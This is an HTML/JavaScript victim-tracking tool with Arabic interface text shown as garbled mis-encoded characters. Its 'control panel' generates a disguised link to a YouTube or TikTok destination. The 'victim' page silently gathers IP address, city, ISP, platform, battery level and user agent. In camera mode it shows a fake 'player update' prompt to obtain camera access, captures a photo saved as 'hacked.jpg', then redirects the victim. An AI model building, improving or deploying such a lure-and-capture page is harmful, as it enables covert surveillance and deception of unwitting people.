<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</title>
    <style>
        :root { --bg: #050505; --card: #0d1117; --neon-blue: #58a6ff; --neon-green: #238636; --text: #c9d1d9; --red: #da3633; }
        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', sans-serif; color: var(--text); }
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .admin-box { background: var(--card); padding: 30px; border-radius: 12px; width: 100%; max-width: 480px; border: 1px solid #30363d; box-shadow: 0 0 50px rgba(0,0,0,0.8); }
        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 800; }
        
        .mode-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .mode-card { 
            background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 10px; 
            text-align: center; cursor: pointer; transition: 0.3s;
        }
        .mode-card.active { border-color: var(--neon-blue); background: rgba(88,166,255,0.1); }
        .mode-card i { display: block; margin-bottom: 8px; font-style: normal; font-size: 20px; }

        input { width: 100%; padding: 14px; background: #010409; border: 1px solid #30363d; border-radius: 8px; color: #fff; margin-bottom: 15px; box-sizing: border-box; }
        .main-btn { background: var(--neon-blue); color: #000; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
        
        .result-box { margin-top: 20px; padding: 15px; background: #010409; border-radius: 8px; border: 1px dashed var(--neon-green); display: none; }
        #log-area { margin-top: 30px; display: none; }
        .data-log { background: #161b22; padding: 15px; border-radius: 8px; border-right: 4px solid var(--neon-green); margin-bottom: 15px; }
        
        /* ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø¶Ø­ÙŠØ© */
        .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .dialog { background: #0d1117; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #30363d; width: 85%; max-width: 350px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="container">
    <div id="admin-panel" class="admin-box">
        <h2>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h2>
        
        <div class="mode-container">
            <div id="m1" class="mode-card active" onclick="selectMode('silent', 'm1')">
                <i>ğŸ“±</i> <b>Ø³Ø­Ø¨ ØµØ§Ù…Øª</b>
                <p style="font-size:10px; color:#8b949e; margin-top:5px;">Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡Ø§ØªÙ Ø¨Ø¯ÙˆÙ† Ø£Ø°ÙˆÙ†Ø§Øª</p>
            </div>
            <div id="m2" class="mode-card" onclick="selectMode('camera', 'm2')">
                <i>ğŸ“¸</i> <b>Ø³Ø­Ø¨ ØµÙˆØ±</b>
                <p style="font-size:10px; color:#8b949e; margin-top:5px;">ÙŠØªØ·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</p>
            </div>
        </div>

        <input type="text" id="targetUrl" placeholder="Ø±Ø§Ø¨Ø· Ø§Ù„ÙˆØ¬Ù‡Ø© (YouTube, TikTok...)">
        <button class="main-btn" onclick="generateLink()">ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø®ØµØµ</button>

        <div id="resultBox" class="result-box">
            <p style="font-size:11px; color:var(--neon-green); margin-bottom:8px;">Ø§Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆØ£Ø±Ø³Ù„Ù‡:</p>
            <input type="text" id="copyLink" readonly onclick="this.select()">
        </div>

        <div id="log-area">
            <div class="data-log">
                <p style="color:var(--neon-blue); margin:0 0 10px 0;">ğŸ“¡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªÙ„Ù…Ø©:</p>
                <div id="device-data" style="font-size:12px; line-height:1.6;"></div>
                <div id="image-data" class="hidden">
                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:10px; border:1px solid var(--neon-blue);">
                    <a id="download-link" download="hacked.jpg" style="display:block; color:var(--neon-green); font-size:12px; text-align:center; margin-top:8px;">â¬‡ï¸ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø©</a>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="victim-ui" class="victim-overlay hidden">
    <div class="dialog">
        <h2 style="color:#fff;">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø´ØºÙ„</h2>
        <p style="color: #8b949e; font-size:14px;">ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„Ù…Ø´ØºÙ„ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„ØªÙØ¹ÙŠÙ„ Ù…ÙŠØ²Ø© Ø§Ù„Ù…Ø´Ø§Ù‡Ø¯Ø© Ø«Ù„Ø§Ø«ÙŠØ© Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯.</p>
        <button id="cameraBtn" style="background:var(--red); color:#fff; border:none; padding:12px 30px; border-radius:8px; cursor:pointer; font-weight:bold; margin-top:15px;">Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø©</button>
    </div>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
</div>

<script>
    let activeMode = 'silent';
    const params = new URLSearchParams(window.location.search);
    const modeKey = params.get('mode');

    function selectMode(mode, id) {
        activeMode = mode;
        document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    // --- Ø³ÙŠÙ†Ø§Ø±ÙŠÙˆ Ø§Ù„Ø¶Ø­ÙŠØ© ---
    if (modeKey) {
        document.getElementById('admin-panel').classList.add('hidden');
        
        async function runExploit() {
            // Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© (ØªØ¹Ù…Ù„ ÙÙŠ ÙƒÙ„ Ø§Ù„Ø£ÙˆØ¶Ø§Ø¹ ØµÙ…ØªØ§Ù‹)
            const ipFetch = await fetch('https://ipapi.co/json/').catch(() => ({}));
            const ipJson = await ipFetch.json ? await ipFetch.json() : {};
            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
            
            const collected = {
                ip: ipJson.ip || "N/A",
                city: ipJson.city || "Unknown",
                isp: ipJson.org || "Unknown",
                os: navigator.platform,
                battery: battery ? (battery.level * 100).toFixed(0) + "%" : "N/A",
                ua: navigator.userAgent
            };
            localStorage.setItem('received_info', JSON.stringify(collected));

            const finalTarget = localStorage.getItem('stored_redirect') || 'https://google.com';

            if (modeKey === 'silent') {
                // ØªØ­ÙˆÙŠÙ„ ÙÙˆØ±ÙŠ Ø¨Ø¯ÙˆÙ† Ø£ÙŠ ÙƒÙ„Ø§Ù…
                window.location.href = finalTarget;
            } else {
                // Ø¥Ø¸Ù‡Ø§Ø± ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                document.getElementById('victim-ui').classList.remove('hidden');
                document.getElementById('cameraBtn').onclick = async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = 640; canvas.height = 480;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            localStorage.setItem('received_img', canvas.toDataURL('image/jpeg'));
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = finalTarget;
                        }, 800);
                    } catch { window.location.href = finalTarget; }
                };
            }
        }
        runExploit();
    }

    // --- Ø³ÙŠÙ†Ø§Ø±ÙŠÙˆ Ø§Ù„Ù…Ø¯ÙŠØ± ---
    function generateLink() {
        const url = document.getElementById('targetUrl').value;
        if (!url) return alert("Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ø£ÙˆÙ„Ø§Ù‹");
        localStorage.setItem('stored_redirect', url);
        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?mode=" + activeMode;
        document.getElementById('resultBox').style.display = 'block';
    }

    window.addEventListener('storage', (e) => {
        document.getElementById('log-area').style.display = 'block';
        if (e.key === 'received_info') {
            const d = JSON.parse(e.newValue);
            document.getElementById('device-data').innerHTML = `
                <b>IP:</b> ${d.ip}<br><b>Ø§Ù„Ù…ÙˆÙ‚Ø¹:</b> ${d.city}<br><b>Ø§Ù„Ù…Ø²ÙˆØ¯:</b> ${d.isp}<br>
                <b>Ø§Ù„Ù†Ø¸Ø§Ù…:</b> ${d.os}<br><b>Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:</b> ${d.battery}
            `;
        }
        if (e.key === 'received_img') {
            document.getElementById('image-data').classList.remove('hidden');
            document.getElementById('captured-img').src = e.newValue;
            document.getElementById('download-link').href = e.newValue;
        }
    });
</script>
</body>
</html>
